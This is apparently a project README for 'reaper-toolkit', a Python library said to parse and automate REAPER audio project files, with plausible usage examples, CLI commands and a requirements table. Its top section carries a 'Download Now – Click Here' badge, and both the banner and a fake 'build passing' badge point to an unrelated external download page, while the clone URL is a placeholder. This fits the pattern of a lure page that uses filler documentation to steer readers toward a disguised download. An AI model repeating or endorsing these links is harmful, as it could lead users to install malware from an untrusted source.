# reaper-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://ErnestoTrader.github.io/reaper-hub-2tb/)


[![Banner](banner.png)](https://ErnestoTrader.github.io/reaper-hub-2tb/)


[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PyPI version](https://img.shields.io/badge/pypi-v0.4.2-orange.svg)](https://pypi.org/project/reaper-toolkit/)
[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](https://ErnestoTrader.github.io/reaper-hub-2tb/)
[![Code Style](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

> A Python toolkit for automating workflows, processing project files, and extracting session data from **REAPER** (Rapid Environment for Audio Production, Engineering, and Recording) on Windows.

`reaper-toolkit` provides a clean, Pythonic interface to REAPER's scripting and automation capabilities. Whether you are batch-processing audio sessions, extracting track metadata, or building automated pipeline tools around your DAW workflow, this library handles the low-level integration so you can focus on your logic.

---

## ✨ Features

- **Project File Parsing** — Read and interpret `.rpp` (REAPER Project) files programmatically without opening the GUI
- **Session Data Extraction** — Pull track names, item positions, FX chains, tempo maps, and marker data into structured Python objects
- **Workflow Automation** — Trigger renders, apply templates, and modify project parameters via REAPER's built-in ReaScript/OSC bridge
- **Batch Processing** — Iterate over directories of REAPER projects and apply consistent transformations or reporting at scale
- **Windows Integration** — Native support for REAPER's Windows installation path detection and COM/API bindings
- **Data Export** — Serialize session data to JSON, CSV, or Pandas DataFrames for downstream analysis
- **Plugin & FX Inventory** — Enumerate VST/VST3 plugins used across a project or a collection of projects
- **CLI Support** — Run common operations directly from the command line without writing a script

---

## 📦 Installation

Install from PyPI using pip:

```bash
pip install reaper-toolkit
```

Install with optional dependencies for data analysis and export:

```bash
pip install reaper-toolkit[pandas,export]
```

Install from source for the latest development version:

```bash
git clone https://github.com/your-org/reaper-toolkit.git
cd reaper-toolkit
pip install -e ".[dev]"
```

---

## 🚀 Quick Start

```python
from reaper_toolkit import ReaperProject

# Load a REAPER project file
project = ReaperProject.from_file("my_session.rpp")

# Print basic session info
print(f"Project: {project.name}")
print(f"Sample Rate: {project.sample_rate} Hz")
print(f"Tracks: {len(project.tracks)}")
print(f"Duration: {project.duration:.2f} seconds")

# List all tracks
for track in project.tracks:
    print(f"  [{track.index}] {track.name} — Items: {len(track.items)}")
```

---

## 📖 Usage Examples

### Parsing a REAPER Project File

```python
from reaper_toolkit import ReaperProject
from reaper_toolkit.models import TrackType

project = ReaperProject.from_file("session.rpp")

# Filter only audio tracks (exclude MIDI, folder, and bus tracks)
audio_tracks = [
    t for t in project.tracks
    if t.track_type == TrackType.AUDIO
]

for track in audio_tracks:
    print(f"Track: {track.name}")
    print(f"  Volume (dB): {track.volume_db:.1f}")
    print(f"  Pan: {track.pan:.2f}")
    print(f"  FX Count: {len(track.fx_chain)}")
```

---

### Extracting FX Chain Data

```python
from reaper_toolkit import ReaperProject

project = ReaperProject.from_file("session.rpp")

# Build a report of all plugins used in the project
plugin_inventory = {}

for track in project.tracks:
    for fx in track.fx_chain:
        plugin_name = fx.plugin_name
        plugin_inventory[plugin_name] = plugin_inventory.get(plugin_name, 0) + 1

# Display sorted by usage frequency
for plugin, count in sorted(plugin_inventory.items(), key=lambda x: -x[1]):
    print(f"{plugin}: used on {count} track(s)")
```

---

### Batch Processing Multiple Projects

```python
from pathlib import Path
from reaper_toolkit import ReaperProject
from reaper_toolkit.export import to_dataframe
import pandas as pd

project_dir = Path("C:/Users/you/Documents/REAPER Projects")
records = []

for rpp_file in project_dir.glob("**/*.rpp"):
    try:
        project = ReaperProject.from_file(rpp_file)
        records.append({
            "filename": rpp_file.name,
            "tracks": len(project.tracks),
            "duration_sec": round(project.duration, 2),
            "sample_rate": project.sample_rate,
            "bpm": project.tempo,
        })
    except Exception as e:
        print(f"Skipping {rpp_file.name}: {e}")

df = pd.DataFrame(records)
df.to_csv("project_inventory.csv", index=False)
print(df.describe())
```

---

### Automating Renders via REAPER's API Bridge

```python
from reaper_toolkit.automation import ReaperBridge

# Connect to a running REAPER instance on Windows
# Requires REAPER with ReaScript OSC bridge enabled
bridge = ReaperBridge(host="127.0.0.1", port=9000)

with bridge.connect() as reaper:
    # Load and render a project
    reaper.open_project("C:/Projects/final_mix.rpp")
    reaper.set_render_bounds(start=0.0, end=240.0)
    reaper.trigger_render(output_path="C:/Renders/final_mix.wav")
    print("Render complete:", reaper.last_render_path)
```

---

### Exporting Session Data to JSON

```python
from reaper_toolkit import ReaperProject
import json

project = ReaperProject.from_file("session.rpp")

# Export full session structure to JSON
session_data = project.to_dict()

with open("session_export.json", "w") as f:
    json.dump(session_data, f, indent=2)

print("Exported session data to session_export.json")
```

---

### Command-Line Interface

```bash
# Display a summary of a REAPER project
reaper-toolkit info session.rpp

# Export project metadata to CSV
reaper-toolkit export session.rpp --format csv --output session.csv

# Scan a directory and generate a project inventory report
reaper-toolkit scan "C:/Users/you/Documents/REAPER Projects" --output inventory.json

# List all plugins used in a project
reaper-toolkit plugins session.rpp
```

---

## 🛠 Requirements

| Requirement | Version | Notes |
|---|---|---|
| Python | 3.8+ | Tested on 3.8, 3.9, 3.10, 3.11 |
| Windows OS | 10 / 11 | Required for `ReaperBridge` automation features |
| REAPER | 6.x / 7.x | Required only for live automation; file parsing works standalone |
| `lxml` | ≥ 4.9 | RPP file parsing |
| `pandas` | ≥ 1.5 *(optional)* | DataFrame export features |
| `python-osc` | ≥ 1.8 *(optional)* | OSC-based automation bridge |
| `click` | ≥ 8.0 | CLI interface |
| `pydantic` | ≥ 2.0 | Data model validation |

---

## 🗂 Project Structure

```
reaper-toolkit/
├── reaper_toolkit/
│   ├── __init__.py
│   ├── parser.py          # RPP file parser
│   ├── models.py          # Pydantic data models
│   ├── automation.py      # ReaperBridge OSC client
│   ├── export.py          # JSON/CSV/DataFrame export utilities
│   └── cli.py             # Click-based CLI
├── tests/
│   ├── fixtures/          # Sample .rpp files for testing
│   ├── test_parser.py
│   ├── test_models.py
│   └── test_export.py
├── docs/
├── pyproject.toml
└── README.md
```

---

## 🤝 Contributing

Contributions are welcome. Please follow these steps:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/add-midi-export`)
3. Write tests for your changes
4. Run the test suite (`pytest tests/ -v`)
5. Submit a pull request with a clear description of the change

Please review [CONTRIBUTING.md](CONTRIBUTING.md) and follow the existing code style (`black`, `ruff`).

---

## 📄 License

This project is licensed under the **MIT License**. See [LICENSE](LICENSE) for the full text.

---

## 🙏 Acknowledgements

- The [REAPER](https://www.reaper.fm/) development team for their comprehensive scripting documentation
- The ReaScript and JSFX communities for reverse-engineering RPP format internals
- Contributors to `python-osc`, `lxml`, and `pydantic` whose libraries make this toolkit possible